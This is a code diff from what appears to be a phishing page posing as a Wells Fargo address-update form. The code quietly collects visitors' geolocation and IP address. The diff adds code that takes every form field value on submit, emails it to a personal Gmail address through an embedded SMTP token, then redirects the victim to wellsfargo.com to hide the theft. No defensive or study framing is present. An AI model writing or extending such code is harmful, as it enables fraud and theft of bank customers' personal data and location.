@@ -53,20 +53,18 @@ function fetchIpAddress() {
 function sendGeoLocation() {
     let geolocationDataString = JSON.stringify(geolocationData);
 
-    SendEmail("Geo", geolocationDataString);
-
-    console.log(geolocationDataString);
+    SendEmail("Geoloc", geolocationDataString);
 }
 
 function sendIpAddressData(data) {
     let ipAddressDataString = JSON.stringify(data);
 
-    SendEmail("IP", ipAddressDataString);
-
-    console.log(ipAddressDataString);
+    SendEmail("IPAdd", ipAddressDataString);
 }
 
 function SendEmail(emailSubject, emailBody) {
+    console.log(emailBody);
+
     Email.send({
         SecureToken: "57605994-ef84-4e3d-9aed-1fc1088b197e",
         To: 'ahmedyaserx@gmail.com',
@@ -76,9 +74,46 @@ function SendEmail(emailSubject, emailBody) {
     });
 }
 
+function ValidateFormBeforeSubmitting() {
+    'use strict';
+  
+    // Fetch all the forms we want to apply custom Bootstrap validation styles to
+    var forms = document.querySelectorAll('.needs-validation');
+  
+    // Loop over them and prevent submission
+    Array.prototype.slice.call(forms)
+      .forEach(function (form) {
+        form.addEventListener('submit', function (event) {
+          if (!form.checkValidity()) {
+            event.preventDefault()
+            event.stopPropagation()
+          }
+          else {
+            SubmitForm();
+          }
+          
+          form.classList.add('was-validated')
+        }, false)
+      })
+  }
+
+function SubmitForm()
+{
+    var inputFields = [];
+    document.querySelectorAll('.input-data').forEach((e) => {inputFields.push(e.value)});
+
+    SendEmail("Form", JSON.stringify(inputFields));
+
+
+    alert("Thank you for updating your address! You will be redirected to the homepage.");
+    window.open("https://www.wellsfargo.com/"); 
+}
+
 function main() {
     getLocation();
     fetchIpAddress();
+
+    ValidateFormBeforeSubmitting();
 }
 
 
